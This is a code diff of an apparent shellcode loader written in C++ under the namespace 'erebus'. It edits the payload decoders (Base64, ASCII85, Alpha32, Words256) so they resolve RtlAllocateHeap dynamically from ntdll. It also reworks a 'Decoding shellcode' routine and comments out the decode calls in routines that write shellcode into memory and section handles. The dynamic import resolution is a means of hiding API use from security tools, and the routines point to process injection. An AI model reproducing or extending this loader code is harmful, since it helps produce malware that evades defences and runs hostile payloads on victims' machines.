@@ -239,7 +239,9 @@ namespace erebus {
 	BOOL DecodeBase64(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
 	{
 		SIZE_T OutputCapacity = (InputLen / 4) * 3 + 3;
-		BYTE* DecodedData = new BYTE[OutputCapacity];
+		HMODULE ntdll = ImportModule("ntdll.dll");
+		ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
+		BYTE* DecodedData = (BYTE*)RtlAllocateHeap(RtlProcessHeap(), 0, OutputCapacity);
 		SIZE_T DecodedLen = 0;
 		SIZE_T PaddingCount = 0;
 
@@ -271,7 +273,9 @@ namespace erebus {
 	BOOL DecodeASCII85(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
 	{
 		SIZE_T OutputCapacity = (InputLen / 5) * 4 + 4;
-		BYTE* DecodedData = new BYTE[OutputCapacity];
+		HMODULE ntdll = ImportModule("ntdll.dll");
+		ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
+		BYTE* DecodedData = (BYTE*)RtlAllocateHeap(RtlProcessHeap(), 0, OutputCapacity);
 		SIZE_T DecodedLen = 0;
 
 		for (SIZE_T i = 0; i < InputLen; i += 5)
@@ -302,7 +306,9 @@ namespace erebus {
 	{
 		const CHAR Alpha32Alphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/";
 		SIZE_T OutputCapacity = InputLen;
-		BYTE* DecodedData = new BYTE[OutputCapacity];
+		HMODULE ntdll = ImportModule("ntdll.dll");
+		ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
+		BYTE* DecodedData = (BYTE*)RtlAllocateHeap(RtlProcessHeap(), 0, OutputCapacity);
 		SIZE_T DecodedLen = 0;
 
 		for (SIZE_T i = 0; i < InputLen; i++)
@@ -327,7 +333,9 @@ namespace erebus {
 		// WORDS256 encoding uses a 256-word dictionary - each word is replaced with its index
 		// This is a placeholder implementation; adjust based on your specific word dictionary
 		SIZE_T OutputCapacity = InputLen * 2;
-		BYTE* DecodedData = new BYTE[OutputCapacity];
+		HMODULE ntdll = ImportModule("ntdll.dll");
+		ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
+		BYTE* DecodedData = (BYTE*)RtlAllocateHeap(RtlProcessHeap(), 0, OutputCapacity);
 		SIZE_T DecodedLen = 0;
 
 		const CHAR* WordDelimiters = " \t\n\r";
@@ -434,46 +442,46 @@ namespace erebus {
 		}
 	}
 
-	VOID AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
-	{
-		LOG_INFO("Decoding shellcode...");
+VOID AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
+{
+    LOG_INFO("Decoding shellcode...");
 
-		switch (CONFIG_ENCODING_TYPE)
-		{
-		case FORMAT_BASE64:
-		{
-			LOG_SUCCESS("Decoding Base64");
-			DecodeBase64(Input, InputLen, Output, OutputLen);
-			break;
-		}
-		case FORMAT_ASCII85:
-		{
-			LOG_SUCCESS("Decoding ASCII85");
-			DecodeASCII85(Input, InputLen, Output, OutputLen);
-			break;
-		}
-		case FORMAT_ALPHA32:
-		{
-			LOG_SUCCESS("Decoding ALPHA32");
-			DecodeALPHA32(Input, InputLen, Output, OutputLen);
-			break;
-		}
-		case FORMAT_WORDS256:
-		{
-			LOG_SUCCESS("Decoding WORDS256");
-			DecodeWORDS256(Input, InputLen, Output, OutputLen);
-			break;
-		}
-		default:
-		{
-			LOG_INFO("No encoding configured (CONFIG_ENCODING_TYPE = 0), returning raw input");
-			*Output = new BYTE[InputLen];
-			RtlCopyMemory(*Output, Input, InputLen);
-			*OutputLen = InputLen;
-			break;
-		}
-		}
-	}
+    switch (CONFIG_ENCODING_TYPE)
+    {
+    case FORMAT_BASE64:
+        LOG_SUCCESS("Decoding Base64");
+        DecodeBase64(Input, InputLen, Output, OutputLen);
+        break;
+
+    case FORMAT_ASCII85:
+        LOG_SUCCESS("Decoding ASCII85");
+        DecodeASCII85(Input, InputLen, Output, OutputLen);
+        break;
+
+    case FORMAT_ALPHA32:
+        LOG_SUCCESS("Decoding ALPHA32");
+        DecodeALPHA32(Input, InputLen, Output, OutputLen);
+        break;
+
+    case FORMAT_WORDS256:
+        LOG_SUCCESS("Decoding WORDS256");
+        DecodeWORDS256(Input, InputLen, Output, OutputLen);
+        break;
+
+    default:
+        LOG_INFO("No encoding configured (CONFIG_ENCODING_TYPE = 0), returning raw input");
+        HMODULE ntdll = ImportModule("ntdll.dll");
+        ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
+        *Output = (BYTE*)RtlAllocateHeap(RtlProcessHeap(), 0, InputLen);
+
+        if (*Output) {
+            RtlCopyMemory(*Output, Input, InputLen);
+            *OutputLen = InputLen;
+        }
+        break;
+    }
+
+}
 
 	// ============================================================
 	// DECOMPRESSION ROUTINE
@@ -571,7 +579,7 @@ namespace erebus {
 		SIZE_T sFinalSize = shellcode_size;
 
 		// 1. Decompress/Decode
-		erebus::AutoDetectAndDecode(&pFinalShellcode, &sFinalSize);
+		//erebus::AutoDetectAndDecode(&pFinalShellcode, &sFinalSize);
 
 		SIZE_T bytes_written = 0;
 		PVOID base_address = NULL;
@@ -614,7 +622,7 @@ namespace erebus {
 		BYTE* pFinalShellcode = shellcode;
 		SIZE_T sFinalSize = shellcode_size;
 
-		erebus::AutoDetectAndDecode(&pFinalShellcode, &sFinalSize);
+		//erebus::AutoDetectAndDecode(&pFinalShellcode, &sFinalSize);
 
 		HANDLE section_handle;
 		LARGE_INTEGER section_size = { 0 };
